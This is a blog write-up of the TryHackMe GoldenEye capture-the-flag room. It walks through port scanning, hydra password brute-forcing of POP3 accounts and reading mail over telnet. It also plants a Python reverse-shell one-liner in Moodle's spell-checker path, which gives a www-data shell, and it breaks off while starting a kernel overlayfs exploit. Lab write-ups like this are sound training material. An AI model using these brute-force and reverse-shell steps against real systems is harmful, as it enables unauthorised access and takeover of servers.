---
layout: post
title: TryHackMe - GoldenEye
date: 2023-09-05 01:32:00 +0700
tags: [hydra, nmap, email, enumeration]
toc: true
---

<p class="message">Bond, James Bond. A guided CTF.</p>

## Task 1: Intro & Enumeration

### First things first, connect to our network and deploy the machine.

No answer needed

### Use nmap to scan the network for all ports. How many ports are open?

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -p- --min-rate 5000 -Pn GoldenEye.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 08:48 EDT
Nmap scan report for GoldenEye.thm (10.10.134.188)
Host is up (0.18s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
25/tcp    open  smtp
80/tcp    open  http
55006/tcp open  unknown
55007/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
```

<p class="message">
✅ ⇒ The answer: <strong>4</strong>

</p>

I also take a deeper Nmap scan for scale-up the enumeration step:

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -A -Pn -p 25,80,55006,55007 GoldenEye.thm
[sudo] password for kali:
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-02 08:48 EDT
Nmap scan report for GoldenEye.thm (10.10.134.188)
Host is up (0.18s latency).

PORT      STATE SERVICE  VERSION
25/tcp    open  smtp     Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
80/tcp    open  http     Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/pop3 Dovecot pop3d
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: PIPELINING USER RESP-CODES UIDL AUTH-RESP-CODE SASL(PLAIN) TOP STLS CAPA
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (98%), Linux 3.10 - 3.13 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   183.81 ms 10.9.0.1
2   183.70 ms GoldenEye.thm (10.10.134.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.98 seconds
```

### Take a look on the website, take a dive into the source code too and remember to inspect all scripts!

<p class="message">
✅ No answer needed

</p>

I use `curl` to dive directly into the page source:

```
<html>
<head>
<title>GoldenEye Primary Admin Server</title>
<link rel="stylesheet" href="index.css">
</head>

        <span id="GoldenEyeText" class="typeing"></span><span class='blinker'>&#32;</span>

<script src="terminal.js"></script>

</html>
```

### Who needs to make sure they update their default password?

Then use `wget` to download the embedded script `terminal.js`:

```
var data = [
  {
    GoldenEyeText: "<span><br/>Severnaya Auxiliary Control Station<br/>****TOP SECRET ACCESS****<br/>Accessing Server Identity<br/>Server Name:....................<br/>GOLDENEYE<br/><br/>User: UNKNOWN<br/><span>Naviagate to /sev-home/ to login</span>"
  }
];

//
//Boris, make sure you update your default password.
//My sources say MI6 maybe planning to infiltrate.
//Be on the lookout for any suspicious network traffic....
//
//I encoded you p@ssword below...
//
//&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
//
//BTW Natalya says she can break your codes
//

var allElements = document.getElementsByClassName("typeing");
for (var j = 0; j < allElements.length; j++) {
  var currentElementId = allElements[j].id;
  var currentElementIdContent = data[0][currentElementId];
  var element = document.getElementById(currentElementId);
  var devTypeText = currentElementIdContent;


  var i = 0, isTag, text;
  (function type() {
    text = devTypeText.slice(0, ++i);
    if (text === devTypeText) return;
    element.innerHTML = text + `<span class='blinker'>&#32;</span>`;
    var char = text.slice(-1);
    if (char === "<") isTag = true;
    if (char === ">") isTag = false;
    if (isTag) return type();
    setTimeout(type, 60);
  })();
}
```

<p class="message">
✅ The answer: <strong>boris</strong>

</p>

### Whats their password?

Encode the following password with **HTML**:

```
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;
```

```
┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ cat password.txt
&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ hURL --html -f password.txt

Original file :: password.txt
HTML DEcoded  :: InvincibleHack3r
```

<p class="message">
✅ Answer: <strong>InvincibleHack3r</strong>

</p>

### Now go use those credentials and login to a part of the site.

<p class="message">
✅ No answer needed

</p>

I wanna keep analyzing the target through terminal. Therefore, I keep using `curl` to view the page source and embed the creds with `-d` flag:

```
┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ curl http://GoldenEye.thm/sev-home/ -u "boris:InvincibleHack3r"
<html>
<head>

<link rel="stylesheet" href="index.css">
</head>

<video poster="val.jpg" id="bgvid" playsinline autoplay muted loop>

<source src="moonraker.webm" type="video/webm">

</video>
<div id="golden">
<h1>GoldenEye</h1>
<p>GoldenEye is a Top Secret Soviet oribtal weapons project. Since you have access you definitely hold a Top Secret clearance and qualify to be a certified GoldenEye Network Operator (GNO) </p>
<p>Please email a qualified GNO supervisor to receive the online <b>GoldenEye Operators Training</b> to become an Administrator of the GoldenEye system</p>
<p>Remember, since <b><i>security by obscurity</i></b> is very effective, we have configured our pop3 service to run on a very high non-default port</p>
</div>

<script src="index.js"></script>
 <!--

Qualified GoldenEye Network Operator Supervisors:
Natalya
Boris

 -->

</html>
```

Keep using `wget` to download the script file:

```
┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ wget --user boris --password InvincibleHack3r http://GoldenEye.thm/sev-home/index.js
--2023-09-02 10:10:15--  http://goldeneye.thm/sev-home/index.js
Resolving goldeneye.thm (goldeneye.thm)... 10.10.109.15
Connecting to goldeneye.thm (goldeneye.thm)|10.10.109.15|:80... connected.
HTTP request sent, awaiting response... 401 Unauthorized
Authentication selected: Basic realm="GoldenEye Restricted Access"
Reusing existing connection to goldeneye.thm:80.
HTTP request sent, awaiting response... 200 OK
Length: 719 [application/javascript]
Saving to: ‘index.js’

index.js                     100%[==============================================>]     719  --.-KB/s    in 0s

2023-09-02 10:10:16 (108 MB/s) - ‘index.js’ saved [719/719]
```

The script content:

{% highlight js linenos %}
var vid = document.getElementById("bgvid");
var pauseButton = document.querySelector("#polina button");

if (window.matchMedia('(prefers-reduced-motion)').matches) {
vid.removeAttribute("autoplay");
vid.pause();
pauseButton.innerHTML = "Paused";
}

function vidFade() {
vid.classList.add("stopfade");
}

vid.addEventListener('ended', function()
{
// only functional if "loop" is removed
vid.pause();
// to capture IE10
vidFade();
});

pauseButton.addEventListener("click", function() {
vid.classList.toggle("stopfade");
if (vid.paused) {
vid.play();
pauseButton.innerHTML = "Pause";
} else {
vid.pause();
pauseButton.innerHTML = "Paused";
}
})

{% endhighlight %}

No helpful information from the script → Forget it!

## Task 2: Its mail time…

### Take a look at some of the other services you found using your nmap scan. Are the credentials you have re-usable?

<p class="message">
✅ No answer needed

</p>

From the Nmap scan, beside the port `80` as **http** service, there are 3 remaining ports:

- `25`: smtp
- `55006`: pop3
- `5507`: pop3

So I use `nc` to connect to those port and try with the creds I’ve found:

```

┌──(kali㉿kali)-[~]
└─$ nc GoldenEye.thm 25
220 ubuntu GoldentEye SMTP Electronic-Mail agent
USER boris
502 5.5.2 Error: command not recognized
quit
221 2.0.0 Bye

┌──(kali㉿kali)-[~]
└─$ nc GoldenEye.thm 55006
USER boris

┌──(kali㉿kali)-[~]
└─$ nc GoldenEye.thm 55007
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
quit
+OK Logging out

```

Only port `55007` allows me to input the username _boris._ However, the password is not re-usable.

### If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra? Whats their new password?

Before using `hydra` to crack the password, I want to use another tool to enumerate and verify whether the user `boris` and `natalya` (from the `terminal.js` comment) exist:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ cat users.txt
boris
natalya

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ smtp-user-enum -U users.txt -t GoldenEye.thm
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

---

| Scan Information |

---

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... users.txt
Target count ............. 1
Username count ........... 2
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............

######## Scan started at Sat Sep 2 10:21:06 2023 #########
GoldenEye.thm: natalya exists
GoldenEye.thm: boris exists
######## Scan completed at Sat Sep 2 10:21:07 2023 #########
2 results.

2 queries in 1 seconds (2.0 queries / sec)

```

`boris` and `natalya` both exist! Now it’s time to use `hydra` to crack their password:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ hydra -L users.txt -P ~/Wordlists/fasttrack.txt pop3://GoldenEye.thm:55007
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-02 11:18:30
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 444 login tries (l:2/p:222), ~28 tries per task
[DATA] attacking pop3://GoldenEye.thm:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 364 to do in 00:05h, 16 active
[55007][pop3] host: GoldenEye.thm login: boris password: secret1!
[STATUS] 85.00 tries/min, 255 tries in 00:03h, 189 to do in 00:03h, 16 active
[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.

[ERROR] POP3 PLAIN AUTH : -ERR Disconnected for inactivity during authentication.

[55007][pop3] host: GoldenEye.thm login: natalya password: bird
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-02 11:23:10

```

<p class="message">
✅ Answer: <strong>secret1!</strong>

</p>

### Inspect port 55007, what services is configured to use this port?

I have use `nc` which stands for **netcat** but the answer is not correct. Luckily, there are more services that could be use to inspect the port `55007` and one of them is `telnet`:

```

┌──(kali㉿kali)-[~]
└─$ telnet GoldenEye.thm 55007
Trying 10.10.87.236...
Connected to GoldenEye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.

```

<p class="message">
✅ Answer: <strong>telnet</strong>

</p>

### Login using that service and the credentials you found earlier.

<p class="message">
✅ No answer needed

</p>

I log in as user **boris** first:

```

┌──(kali㉿kali)-[~]
└─$ telnet GoldenEye.thm 55007
Trying 10.10.87.236...
Connected to GoldenEye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS secret1!
+OK Logged in.
LIST
+OK 3 messages:
1 544
2 373
3 921
.
RETR 1
+OK 544 octets
Return-Path: <root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
by ubuntu (Postfix) with SMTP id D9E47454B1
for <boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: <20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.
.
RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
by ubuntu (Postfix) with ESMTP id C3F2B454B1
for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.
RETR 3
+OK 921 octets
Return-Path: <alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
by ubuntu (Postfix) with ESMTP id 4B9F4454B1
for <boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: <20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.

.

```

Then, do the same with **natalya**:

```

┌──(kali㉿kali)-[~]
└─$ telnet GoldenEye.thm 55007
Trying 10.10.87.236...
Connected to GoldenEye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER natalya
+OK
PASS bird
+OK Logged in.
LIST
+OK 2 messages:
1 631
2 1048
.
RETR 1
+OK 631 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
by ubuntu (Postfix) with ESMTP id D5EDA454B1
for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: <20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
.
RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
by ubuntu (Postfix) with SMTP id 17C96454B1
for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
\*\*Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

.
QUIT
+OK Logging out.
Connection closed by foreign host.

```

### What can you find on this service?

What I have found from these 2 users from port `55007` are messages which are actually emails.

<p class="message">
✅ Answer: <strong>emails</strong>

</p>

### What user can break Boris' codes?

From the email (message) `373` sent by **natalya**, I can read the content inside is “_Boris, I can break your codes!“_

```

RETR 2
+OK 373 octets
Return-Path: <natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
by ubuntu (Postfix) with ESMTP id C3F2B454B1
for <boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: <20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!
.

```

<p class="message">
✅ Answer: <strong>natalya</strong>

</p>

### Using the users you found on this service, find other users passwords

<p class="message">
✅ No answer needed

</p>

From the email (message) `1048` sent by **root**:

```

RETR 2
+OK 1048 octets
Return-Path: <root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
by ubuntu (Postfix) with SMTP id 17C96454B1
for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: <20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
\*\*Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.

.

```

### Keep enumerating users using this service and keep attempting to obtain their passwords via dictionary attacks.

<p class="message">
✅ No answer needed

</p>

I tried to use the creds I have found in the previous message but it was not correct:

```

┌──(kali㉿kali)-[~]
└─$ telnet GoldenEye.thm 55007
Trying 10.10.87.236...
Connected to GoldenEye.thm.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER xenia
+OK
PASS RCP90rulez!
-ERR [AUTH] Authentication failed.
QUIT
+OK Logging out
Connection closed by foreign host.

```

Then I have to use `hydra` again to crack this user’s password:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ hydra -l xenia -P ~/Wordlists/fasttrack.txt pop3://GoldenEye.thm:55007
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-02 11:40:41
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://GoldenEye.thm:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[STATUS] 58.67 tries/min, 176 tries in 00:03h, 46 to do in 00:01h, 16 active
[STATUS] 56.00 tries/min, 224 tries in 00:04h, 1 to do in 00:01h, 4 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-02 11:44:59

```

Now the dictionary `fasttrack.txt` is no longer usable to crack the password. I’ve tried with the `rockyou.txt` but it took too long and did not work too.

## Task 3: GoldenEye Operations Training

> **Instructions**
>
> If you remembered in some of the emails you discovered, there is the [severnaya-station.com](http://severnaya-station.com/) website. To get this working, you need up update your DNS records to reveal it.
>
> If you're on Linux edit your "/etc/hosts" file and add:
>
> <machines ip> [severnaya-station.com](http://severnaya-station.com/)
>
> If you're on Windows do the same but in the "c:\Windows\System32\Drivers\etc\hosts" file

First of all, I follow the instructions of the task and change the DNS in the `/etc/hosts` file:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ sudo nano /etc/hosts

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ sudo cat /etc/hosts | grep "severnaya"
10.10.87.236 severnaya-station.com

```

### Once you have done that, in your browser navigate to: http://severnaya-station.com/gnocertdir

<p class="message">
✅ No answer needed

</p>

![Untitled](/assets/Golden%20Eye%20images/Untitled.png)

### Try using the credentials you found earlier. Which user can you login as?

I click on the **Login** on top-right corner → Use the creds of user `xenia` to login:

![Untitled](/assets/Golden%20Eye%20images/Untitled%201.png)

![Untitled](/assets/Golden%20Eye%20images/Untitled%202.png)

<p class="message">
✅ ⇒ Answer: **xenia**

</p>

### Have a poke around the site. What other user can you find?

On the **Navigation** bar → Click on **Messages** > On the dropdown menu, select **Recent conversations**:

![Untitled](/assets/Golden%20Eye%20images/Untitled%203.png)

<p class="message">
✅ Answer: <strong>Doak</strong>

</p>

### What was this users password?

It’s time to re-use `hydra` to crack the password of the new user which have been found earlier:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ hydra -l doak -P ~/Wordlists/fasttrack.txt pop3://severnaya-station.com:55007
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these \*\*\* ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-09-02 12:04:50
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
[DATA] attacking pop3://severnaya-station.com:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
[55007][pop3] host: severnaya-station.com login: doak password: goat
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-09-02 12:07:16

```

<p class="message">
✅ Answer: <strong>goat</strong>

</p>

### Use this users credentials to go through all the services you have found to reveal more emails.

<p class="message">
✅ No answer needed

</p>

So I get back to the terminal and use the **telnet** service → Log in as user `doak` → Read the message:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ telnet severnaya-station.com 55007
Trying 10.10.133.138...
Connected to severnaya-station.com.
Escape character is '^]'.
+OK GoldenEye POP3 Electronic-Mail System
USER doak
+OK
PASS goat
+OK Logged in.
LIST
+OK 1 messages:
1 606
.
RETR 1
+OK 606 octets
Return-Path: <doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
by ubuntu (Postfix) with SMTP id 97DC24549D
for <doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: <20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!

.
QUIT
+OK Logging out.
Connection closed by foreign host.

```

### What is the next user you can find from doak?

The user has been found in the previous step

<p class="message">
✅ The answer: <strong>dr_doak</strong>

</p>

### What is this users password?

The password has been found in the previous steps

<p class="message">
✅ The answer: <strong>4England!</strong>

</p>

### Take a look at their files on the moodle (severnaya-station.com)

<p class="message">
✅ No answer needed

</p>

Use the earlier found creds to log in the web-page application → Navigate to **Navigation** bar → Select _My home_ → Locate the _My private files_ section → Expand the folder `for james`:

![Untitled](/assets/Golden%20Eye%20images/Untitled%204.png)

### Download the attachments and see if there are any hidden messages inside them?

<p class="message">
✅ No answer needed

</p>

Simply click on the file name to download the file → Read the hidden messages inside:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ cat s3cret.txt
007,

I was able to capture this apps adm1n cr3ds through clear txt.

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.

```

### Using the information you found in the last task, login with the newly found user.

<p class="message">
✅ No answer needed

</p>

First of all, download the mentioned `.jpg` file from the message:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ wget http://severnaya-station.com/dir007key/for-007.jpg
--2023-09-03 11:48:07-- http://severnaya-station.com/dir007key/for-007.jpg
Resolving severnaya-station.com (severnaya-station.com)... 10.10.133.138
Connecting to severnaya-station.com (severnaya-station.com)|10.10.133.138|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14896 (15K) [image/jpeg]
Saving to: ‘for-007.jpg’

for-007.jpg 100%[============================>] 14.55K 68.3KB/s in 0.2s

2023-09-03 11:48:08 (68.3 KB/s) - ‘for-007.jpg’ saved [14896/14896]

```

Use `exiftool` to view the file information and notice at the **Image Description** line:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ exiftool for-007.jpg
ExifTool Version Number : 12.57
File Name : for-007.jpg
Directory : .
File Size : 15 kB
File Modification Date/Time : 2018:04:24 20:40:02-04:00
File Access Date/Time : 2023:09:03 11:48:08-04:00
File Inode Change Date/Time : 2023:09:03 11:48:08-04:00
File Permissions : -rw-r--r--
File Type : JPEG
File Type Extension : jpg
MIME Type : image/jpeg
JFIF Version : 1.01
X Resolution : 300
Y Resolution : 300
Exif Byte Order : Big-endian (Motorola, MM)
Image Description : eFdpbnRlcjE5OTV4IQ==
Make : GoldenEye
Resolution Unit : inches
Software : linux
Artist : For James
Y Cb Cr Positioning : Centered
Exif Version : 0231
Components Configuration : Y, Cb, Cr, -
User Comment : For 007
Flashpix Version : 0100
Image Width : 313
Image Height : 212
Encoding Process : Baseline DCT, Huffman coding
Bits Per Sample : 8
Color Components : 3
Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1)
Image Size : 313x212
Megapixels : 0.066

```

The string was encoded as **base64** → Decode it using `base64 -d`:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ echo "eFdpbnRlcjE5OTV4IQ==" | base64 -d
xWinter1995x!

```

Then use this password and the username as `admin` to login the web-application:

![Untitled](/assets/Golden%20Eye%20images/Untitled%205.png)

> As this user has more site privileges, you are able to edit the moodles settings. From here get a reverse shell using python and netcat.

### Take a look into Aspell, the spell checker plugin.

<p class="message">
✅ No answer needed

</p>

Navigate to the **Settings** bar → Type `spell` into the search field and click **Search.**

Once the search process is done (half of a second), select **PSpellShell** at the dropdown-menu _Spell engine_ and change the _Path to aspell_ to a python reverse shell with following payload from this [source](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python):

```

python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$YOUR_IP",$YOUR_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh"

```

![Untitled](/assets/Golden%20Eye%20images/Untitled%206.png)

Click _Save changes_ → Then start a listener on local machine:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ nc -lvnp 4444
listening on [any] 4444 ...

```

On **Navigation** bar → Expand the **Blogs** → Select _Add a new entry_ → On the right-hand, click on the icon which would display _Toggle spellchecker_ when being hover on:

![Untitled](/assets/Golden%20Eye%20images/Untitled%207.png)

Then I connected to the system through my reverse shell payload:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.9.63.75] from (UNKNOWN) [10.10.133.138] 58940
bash: cannot set terminal process group (1047): Inappropriate ioctl for device
bash: no job control in this shell
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$

```

## Task 4: Privilege Escalation

> **Instructions**
> Now that you have enumerated enough to get an administrative moodle login and gain a reverse shell, its time to priv esc.

There is another option in this part → Enumerate automatically following these steps:

Download the [linuxprivchecker](https://gist.github.com/sh1n0b1/e2e1a5f63fbec3706123) to enumerate installed development tools.

To get the file onto the machine, you will need to wget your local machine as the VM will not be able to wget files on the internet. Follow the steps to get a file onto your VM:

- Download the linuxprivchecker file locally
- Navigate to the file on your file system
- Do: **python -m SimpleHTTPServer 1337** (leave this running)
- On the VM you can now do: wget /.py

But in this write-up, I will perform the manual way:

### What is the kernel version?

```

<ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

```

<p class="message">
✅ The answer: <strong>3.13.0-32-generic</strong>

</p>

### Skip the questions _No answer needed_ → Perform the exploit process:

Search for the **Exploit Path**:

```

┌──(kali㉿kali)-[~/TryHackMe/GoldenEye]
└─$ searchsploit "kernel 3.13 overlay"

---

Exploit Title | Path

---

Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37292.c
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/1 | linux/local/37293.txt

---

Shellcodes: No Results

```

<p class="message">
💡 You can find the keyword `overlay` from the task’s instructions:
”<i>This machine is vulnerable to the overlayfs exploit.</i>”

</p>

Copy the exploit path to the current directory using `-m` (`--mirror`) flag → Start **http.server** to transfer the file to the target machine:

```

